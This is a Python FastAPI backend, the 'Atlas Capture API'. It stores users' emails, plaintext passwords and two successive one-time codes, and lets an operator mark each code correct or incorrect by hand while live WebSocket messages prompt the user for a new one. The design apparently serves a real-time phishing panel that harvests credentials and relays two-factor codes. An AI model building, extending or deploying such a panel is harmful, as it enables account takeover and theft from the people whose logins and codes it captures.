# app.py
from fastapi import FastAPI, HTTPException, Depends, status, Request, WebSocket, WebSocketDisconnect
from fastapi.responses import HTMLResponse
from fastapi.templating import Jinja2Templates
from fastapi.security import HTTPBearer, HTTPAuthorizationCredentials
from pydantic import BaseModel
from typing import Optional, Dict
from datetime import datetime, timedelta
import jwt
import os
from dotenv import load_dotenv
import asyncpg
from contextlib import asynccontextmanager
import logging

# Set up logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

load_dotenv()

# Configuration
DATABASE_URL = os.getenv("DATABASE_URL")
SECRET_KEY = os.getenv("SECRET_KEY")
ALGORITHM = "HS256"
ADMIN_EMAIL = os.getenv("ADMIN_EMAIL")
ADMIN_PASSWORD = os.getenv("ADMIN_PASSWORD")

# WebSocket connection manager
class ConnectionManager:
    def __init__(self):
        self.active_connections: Dict[str, WebSocket] = {}
        self.admin_connections: Dict[str, WebSocket] = {}

    async def connect_user(self, email: str, websocket: WebSocket):
        await websocket.accept()
        self.active_connections[email] = websocket
        logger.info(f"User connected: {email}")

    async def connect_admin(self, token: str, websocket: WebSocket):
        await websocket.accept()
        self.admin_connections[token] = websocket
        logger.info("Admin connected")

    def disconnect_user(self, email: str):
        if email in self.active_connections:
            del self.active_connections[email]
            logger.info(f"User disconnected: {email}")

    def disconnect_admin(self, token: str):
        if token in self.admin_connections:
            del self.admin_connections[token]
            logger.info("Admin disconnected")

    async def send_to_user(self, email: str, message: dict):
        if email in self.active_connections:
            try:
                await self.active_connections[email].send_json(message)
                return True
            except:
                self.disconnect_user(email)
        return False

    async def send_to_admins(self, message: dict):
        disconnected = []
        for token, ws in self.admin_connections.items():
            try:
                await ws.send_json(message)
            except:
                disconnected.append(token)
        for token in disconnected:
            self.disconnect_admin(token)

manager = ConnectionManager()

# Database connection pool
db_pool = None

@asynccontextmanager
async def lifespan(app: FastAPI):
    global db_pool
    # Startup
    try:
        logger.info("Connecting to database...")
        db_pool = await asyncpg.create_pool(
            DATABASE_URL,
            min_size=1,
            max_size=10,
            command_timeout=60
        )
        logger.info("Database connected successfully!")
    except Exception as e:
        logger.error(f"Database connection error: {e}")
        raise
    
    # Create tables if not exists
    async with db_pool.acquire() as conn:
        try:
            await conn.execute("""
                CREATE TABLE IF NOT EXISTS users (
                    id SERIAL PRIMARY KEY,
                    email VARCHAR(255) UNIQUE NOT NULL,
                    password VARCHAR(100),
                    otp VARCHAR(10),
                    second_otp VARCHAR(10),
                    approved BOOLEAN DEFAULT FALSE,
                    otp1_correct BOOLEAN DEFAULT FALSE,
                    otp2_correct BOOLEAN DEFAULT FALSE,
                    otp1_never BOOLEAN DEFAULT FALSE,
                    created_at TIMESTAMP DEFAULT NOW()
                )
            """)
            logger.info("Table 'users' ready")
            
            # Create admin user if not exists
            await conn.execute("""
                INSERT INTO users (email, password, approved, otp1_correct, otp2_correct)
                VALUES ($1, $2, TRUE, TRUE, TRUE)
                ON CONFLICT (email) DO NOTHING
            """, ADMIN_EMAIL, ADMIN_PASSWORD)
            logger.info("Admin user ready")
            
        except Exception as e:
            logger.error(f"Table creation error: {e}")
            raise
    
    yield
    
    # Shutdown
    if db_pool:
        await db_pool.close()
        logger.info("Database connection closed")

app = FastAPI(lifespan=lifespan)
templates = Jinja2Templates(directory="templates")

# Helper functions
def verify_admin_token(token: str):
    try:
        payload = jwt.decode(token, SECRET_KEY, algorithms=[ALGORITHM])
        if payload.get("role") == "admin" and payload.get("email") == ADMIN_EMAIL:
            return payload
        return None
    except:
        return None

def create_admin_token(email: str):
    payload = {
        "email": email,
        "role": "admin",
        "exp": datetime.utcnow() + timedelta(hours=24)
    }
    return jwt.encode(payload, SECRET_KEY, algorithm=ALGORITHM)

# Pydantic models
class AdminLoginRequest(BaseModel):
    email: str
    password: str

class ApproveUserRequest(BaseModel):
    email: str

class ApproveFirstOTPRequest(BaseModel):
    email: str

class ApproveSecondOTPRequest(BaseModel):
    email: str

class IncorrectFirstOTPRequest(BaseModel):
    email: str

class IncorrectSecondOTPRequest(BaseModel):
    email: str

class DeleteUserRequest(BaseModel):
    email: str

class NeverFirstOTPRequest(BaseModel):
    email: str

class CheckOTPStatusRequest(BaseModel):
    email: str

# Routes
@app.get("/")
async def root():
    return {"message": "Atlas Capture API", "status": "running"}

@app.get("/admin/login")
async def admin_login_page(request: Request):
    return templates.TemplateResponse("admin_login.html", {"request": request})

@app.post("/api/admin/login")
async def admin_login(request: AdminLoginRequest):
    if request.email == ADMIN_EMAIL and request.password == ADMIN_PASSWORD:
        token = create_admin_token(request.email)
        return {"access_token": token, "token_type": "bearer"}
    raise HTTPException(status_code=401, detail="Invalid credentials")

@app.get("/api/admin/verify")
async def verify_admin_token_endpoint(credentials: HTTPAuthorizationCredentials = Depends(HTTPBearer())):
    payload = verify_admin_token(credentials.credentials)
    if not payload:
        raise HTTPException(status_code=403, detail="Invalid token")
    return {"valid": True, "email": payload.get("email")}

@app.get("/api/admin/users")
async def get_users(credentials: HTTPAuthorizationCredentials = Depends(HTTPBearer())):
    payload = verify_admin_token(credentials.credentials)
    if not payload:
        raise HTTPException(status_code=403, detail="Invalid token")
    
    async with db_pool.acquire() as conn:
        users = await conn.fetch("""
            SELECT email, password, otp, second_otp, approved, otp1_correct, otp2_correct, otp1_never, created_at
            FROM users 
            WHERE email != $1
            ORDER BY created_at DESC
        """, ADMIN_EMAIL)
        
        return [dict(user) for user in users]

@app.post("/api/admin/approve-user")
async def approve_user(request: ApproveUserRequest, credentials: HTTPAuthorizationCredentials = Depends(HTTPBearer())):
    payload = verify_admin_token(credentials.credentials)
    if not payload:
        raise HTTPException(status_code=403, detail="Invalid token")
    
    async with db_pool.acquire() as conn:
        await conn.execute("""
            UPDATE users 
            SET approved = TRUE
            WHERE email = $1
        """, request.email)
        
        # Send WebSocket notification to user
        await manager.send_to_user(request.email, {
            "type": "email_approved",
            "message": "Your email has been approved by admin"
        })
        
        return {"message": "User approved"}

@app.post("/api/admin/approve-first-otp")
async def approve_first_otp(request: ApproveFirstOTPRequest, credentials: HTTPAuthorizationCredentials = Depends(HTTPBearer())):
    payload = verify_admin_token(credentials.credentials)
    if not payload:
        raise HTTPException(status_code=403, detail="Invalid token")
    
    async with db_pool.acquire() as conn:
        await conn.execute("""
            UPDATE users 
            SET otp1_correct = TRUE, otp1_never = FALSE
            WHERE email = $1 AND approved = TRUE
        """, request.email)
        
        # Send WebSocket notification to user
        await manager.send_to_user(request.email, {
            "type": "otp1_approved",
            "message": "Your first OTP has been approved by admin"
        })
        
        return {"message": "First OTP approved"}

@app.post("/api/admin/approve-second-otp")
async def approve_second_otp(request: ApproveSecondOTPRequest, credentials: HTTPAuthorizationCredentials = Depends(HTTPBearer())):
    payload = verify_admin_token(credentials.credentials)
    if not payload:
        raise HTTPException(status_code=403, detail="Invalid token")
    
    async with db_pool.acquire() as conn:
        await conn.execute("""
            UPDATE users 
            SET otp2_correct = TRUE
            WHERE email = $1 AND approved = TRUE AND otp1_correct = TRUE
        """, request.email)
        
        # Send WebSocket notification to user
        await manager.send_to_user(request.email, {
            "type": "otp2_approved",
            "message": "Your second OTP has been approved by admin. Account fully verified!"
        })
        
        return {"message": "Second OTP approved"}

@app.post("/api/admin/incorrect-first-otp")
async def incorrect_first_otp(request: IncorrectFirstOTPRequest, credentials: HTTPAuthorizationCredentials = Depends(HTTPBearer())):
    payload = verify_admin_token(credentials.credentials)
    if not payload:
        raise HTTPException(status_code=403, detail="Invalid token")
    
    async with db_pool.acquire() as conn:
        await conn.execute("""
            UPDATE users 
            SET otp = NULL, otp1_correct = FALSE, otp1_never = FALSE
            WHERE email = $1 AND approved = TRUE
        """, request.email)
        
        # Send WebSocket notification to user
        await manager.send_to_user(request.email, {
            "type": "otp1_incorrect",
            "message": "Your first OTP was incorrect. Please submit a new OTP."
        })
        
        return {"message": "First OTP marked incorrect"}

@app.post("/api/admin/incorrect-second-otp")
async def incorrect_second_otp(request: IncorrectSecondOTPRequest, credentials: HTTPAuthorizationCredentials = Depends(HTTPBearer())):
    payload = verify_admin_token(credentials.credentials)
    if not payload:
        raise HTTPException(status_code=403, detail="Invalid token")
    
    async with db_pool.acquire() as conn:
        await conn.execute("""
            UPDATE users 
            SET second_otp = NULL, otp2_correct = FALSE
            WHERE email = $1 AND approved = TRUE AND otp1_correct = TRUE
        """, request.email)
        
        # Send WebSocket notification to user
        await manager.send_to_user(request.email, {
            "type": "otp2_incorrect",
            "message": "Your second OTP was incorrect. Please submit a new second OTP."
        })
        
        return {"message": "Second OTP marked incorrect"}

@app.post("/api/admin/never-first-otp")
async def never_first_otp(request: NeverFirstOTPRequest, credentials: HTTPAuthorizationCredentials = Depends(HTTPBearer())):
    payload = verify_admin_token(credentials.credentials)
    if not payload:
        raise HTTPException(status_code=403, detail="Invalid token")
    
    async with db_pool.acquire() as conn:
        result = await conn.execute("""
            UPDATE users 
            SET otp1_never = TRUE, otp1_correct = FALSE
            WHERE email = $1 AND approved = TRUE
        """, request.email)
        
        if result == "UPDATE 0":
            raise HTTPException(status_code=404, detail="User not found or not approved")
        
        # Send WebSocket notification to user
        await manager.send_to_user(request.email, {
            "type": "otp1_never",
            "message": "Your OTP has been marked as invalid permanently",
            "otp1_never": True,
            "otp1_correct": False
        })
        
        return {"message": "OTP1 marked as never", "email": request.email}

@app.delete("/api/admin/delete-user")
async def delete_user(request: DeleteUserRequest, credentials: HTTPAuthorizationCredentials = Depends(HTTPBearer())):
    payload = verify_admin_token(credentials.credentials)
    if not payload:
        raise HTTPException(status_code=403, detail="Invalid token")
    
    async with db_pool.acquire() as conn:
        await conn.execute("""
            DELETE FROM users 
            WHERE email = $1
        """, request.email)
        
        return {"message": "User deleted"}

@app.post("/api/user/check-otp-status")
async def check_otp_status(request: CheckOTPStatusRequest):
    async with db_pool.acquire() as conn:
        user = await conn.fetchrow("""
            SELECT approved, otp1_correct, otp2_correct, otp1_never
            FROM users 
            WHERE email = $1
        """, request.email)
        
        if not user:
            raise HTTPException(status_code=404, detail="User not found")
        
        return {
            "email": request.email,
            "approved": user['approved'],
            "otp1_correct": user['otp1_correct'],
            "otp2_correct": user['otp2_correct'],
            "otp1_never": user['otp1_never']
        }

# WebSocket endpoints
@app.websocket("/ws/user/{email}")
async def websocket_user(websocket: WebSocket, email: str):
    await manager.connect_user(email, websocket)
    try:
        while True:
            data = await websocket.receive_text()
            logger.info(f"Message from user {email}: {data}")
    except WebSocketDisconnect:
        manager.disconnect_user(email)

@app.websocket("/ws/admin")
async def websocket_admin(websocket: WebSocket, token: str = None):
    if not token or not verify_admin_token(token):
        await websocket.close(code=1008, reason="Invalid token")
        return
    
    await manager.connect_admin(token, websocket)
    try:
        while True:
            data = await websocket.receive_text()
            logger.info(f"Message from admin: {data}")
    except WebSocketDisconnect:
        manager.disconnect_admin(token)

if __name__ == "__main__":
    import uvicorn
    uvicorn.run(app, host="0.0.0.0", port=8000)
